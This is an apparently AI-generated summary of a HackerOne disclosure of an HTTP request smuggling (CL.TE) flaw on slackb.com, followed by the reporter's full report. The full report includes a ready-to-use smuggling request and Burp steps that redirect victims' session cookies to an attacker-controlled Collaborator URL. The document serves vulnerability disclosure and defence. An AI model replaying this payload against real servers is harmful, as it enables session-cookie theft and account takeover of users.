# Mass Account Takeovers via HTTP Request Smuggling (CLTE) on slackb.com

## Metadata
- **Source:** HackerOne
- **Report:** 737140 | https://hackerone.com/reports/737140
- **Submitted:** 2019-11-14
- **Reporter:** defparam
- **Program:** Slack
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** HTTP Request Smuggling, CL.TE (Content-Length/Transfer-Encoding) Desynchronization, Session Cookie Theft, Socket Poisoning, HTTP Response Injection
- **CVEs:** None
- **Category:** auth-crypto

## Summary
HTTP Request Smuggling vulnerability on slackb.com exploits desynchronization between frontend and backend servers via malformed Transfer-Encoding header (CLTE attack). This allows attackers to inject requests into victim sessions, steal session cookies (particularly the 'd' cookie), and achieve complete account takeover of Slack users.

## Attack scenario
1. Attacker crafts malicious HTTP request with space in 'Transfer-Encoding : chunked' header to bypass frontend parsing while backend still interprets it as Transfer-Encoding
2. Frontend server interprets request using Content-Length, backend uses Transfer-Encoding: chunked, causing desynchronization and socket poisoning
3. Attacker prepends malicious payload to victim's next HTTP request, forcing it to execute as 'GET <attacker-url> HTTP/1.1'
4. Slack backend processes hijacked request and issues 301 redirect with victim's session cookies (including 'd' cookie) to attacker-controlled URL
5. Attacker captures session cookie via Burp Collaborator or similar out-of-band data exfiltration technique
6. Attacker uses stolen 'd' session cookie to impersonate victim and access all their Slack data, channels, conversations, and organizational information

## Root cause
Frontend and backend servers parse HTTP headers inconsistently when Transfer-Encoding header contains malformed syntax (space before colon). Frontend treats it as unknown header and uses Content-Length; backend still recognizes it as Transfer-Encoding. This desynchronization allows an attacker to inject data into the request stream that gets interpreted as part of a subsequent victim's request, leading to socket poisoning and request hijacking.

## Attacker mindset
Sophisticated HTTP protocol researcher with deep knowledge of RFC interpretations and server behavior differences. Focused on finding edge cases in header parsing that create desynchronization opportunities. Motivated by potential for large-scale attacks affecting entire Slack customer base. Demonstrates methodical approach using custom tooling (Smuggler) and responsible disclosure despite identifying an extremely high-impact vulnerability.

## Defensive takeaways
- Strictly validate and normalize HTTP headers on both frontend and backend servers, rejecting malformed Transfer-Encoding headers
- Implement consistent HTTP/1.1 parsing across all server components; any difference in interpretation is a critical vulnerability
- Always prioritize Transfer-Encoding over Content-Length per RFC 7230; reject requests with both headers present
- Add rate limiting and anomaly detection for requests with malformed headers or unusual header combinations
- Implement request validation at boundary between frontend and backend to detect request smuggling patterns
- Use security headers and ensure session cookies use HttpOnly, Secure, and SameSite flags to limit exfiltration impact
- Monitor for requests with User-Agent 'Smuggler' or similar security testing tools in logs
- Conduct HTTP parsing security reviews comparing frontend and backend implementations for desynchronization vulnerabilities
- Implement request logging that captures raw HTTP headers before parsing to enable forensic analysis of attacks

## Variant hunting
Search for similar CLTE desynchronization vulnerabilities on other Slack infrastructure domains and subdomains. Test TECL (Transfer-Encoding/Content-Length reversed priority) attacks. Investigate cache poisoning variants using HTTP smuggling to poison response caches. Look for similar header parsing inconsistencies in other header fields (spaces, case sensitivity, comments). Test various malformed Transfer-Encoding values (tabs, null bytes, unicode normalization). Examine load balancer configurations for inconsistent HTTP parsing between proxy and origin servers.

## MITRE ATT&CK
- T1190
- T1583.001
- T1589.002
- T1539
- T1528
- T1598.003
- T1114

## Notes
First-time bug bounty submission demonstrates exceptional security research capability. Report includes excellent technical explanation with visual diagrams and step-by-step reproduction. Clear evidence of responsible disclosure. The vulnerability's criticality stems from combination of: (1) trivial exploitation, (2) massive scale impact (affects any Slack user), (3) direct session hijacking, (4) access to sensitive organizational data. The 'd' session cookie appears to be the primary Slack session identifier. Report suggests potential active exploitation was unlikely given researcher's ethical approach and responsible disclosure. Slack's response timeframe and patches not provided in report.

## Full report
<details><summary>Expand</summary>

Hi Slack Security Team!

My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets. In my research I stumbled across a finding that I consider extremely critical not only for Slack but for all customers and organizations which share their privatedata/channels/conversations on Slack.

The bug chain is as follows:
1) HTTP Request Smuggling CTLE to Arbitrary Request Hijacking (Poisoned Socket) on `slackb.com`
2) Request Hijack forces victim HTTP requests to instead use `GET https://<URL> HTTP/1.1` on `slackb.com`
3) A request of `GET https://<URL> HTTP/1.1` on the backend server socket results in a 301 redirect to `https://<URL>` with slack cookies (most importantly the `d` cookie)
4) Me with my Burp Collaborator steals victims cookies by using a collaborator server as the defined <URL> in the attack
5) Me (if I were evil) collects massive amounts of `d` session cookies and steals any/all possble Slack user/organization data from victim sessions

So let's start from the beginning. I was running `smuggler -u https://slackb.com` running my array of exhaustive tests when I stumbled upon a failure with test: `space1` (see below)

{F633736}

The `space1` tests checks for HTTP desync with the following payload:

{F633737}

This testcase failed on testing a CLTE and not a TECL. A CLTE is a webrequest that has both the `Transfer-Encoding: chunked` header (specified in some abnormal way) and the `Content-Length: ` header. According to the RFC when both headers are specified the TE always takes priority. However, if the TE header is malformed the webrequest may get interpreted differently between the frontend and the backend server. The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method. This causes a desync on the webrequest and can poison the backend socket causing data to be pre-pended to the next webrequest from a victim. The `space1` payload places a space character in between `Transfer-Encoding` and the colon `:`. This is enough for the frontend to not understand the request as TE and instead as CE but not enough for the backend to process it in the same way.

One popular attack with a CLTE is to prepend data to the next request that would "erase" the victim's HTTP request using a custom header semantic and for the poison socket data to re-specify the HTTP method and endpoint. Here is what the payload looks like with the `slackb.com` attack. The best way I can explain it is through Visio using these diagrams (see below)

{F633741}

Explanation of the malicious request:

{F633743}

Here are your steps to triage:
1) Open up a fresh Burp
2) Open up a fresh Collaborator by going to menu: `Burp->Burp Collaborator Client`
3) In the Collaborator Client click on `Copy to clipboard` for the server URL
4) Go to the Repeater tab
5) Add the following payload and replace <URL> with your collaborator URL
```
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET <URL> HTTP/1.1
X: X
```
6) Set the repeater target to: `host: slackb.com , Port: 443 (SSL)`  by double clicking on target
7) Press go
8) In the Collaborator window click `Poll now` until you see requests

The attack should roughly look like this:
Burp Repeater:
{F633745}

Collaborator DNS request: (The Victim's IP Address is leaked too!)
{F633746}

The special cookie stolen from this attack:
{F633749}

At this point you just attacked an arbitrary slack customer and have access to her `d` session cookie.
From here you can plug the session cookie into your browser and have full account takeover, Scrape all data and move onto the next victim.

I'm happy to help if you have any further questions. Most of my requests have been made using the `User-Agent: Smuggler/v1.0` header, feel free to review traffic logs keying off that.

Have a nice day!
Best,
Evan

## Impact

So it is my opinion that this is a severe critical vulnerability that could lead to a massive data breach of a majority of customer data. With this attack it would be trivial for a bad actor to create bots that consistantly issue this attack, jump onto the victim session and steal all possible data within reach. 

I am really happy I found this for you guys so that it can be dealt with ASAP. I really hope there haven't been any attacks on customers using this vulnerability.

Best Wishes,
Evan

</details>

---
*Analysed by Claude on 2026-05-24*
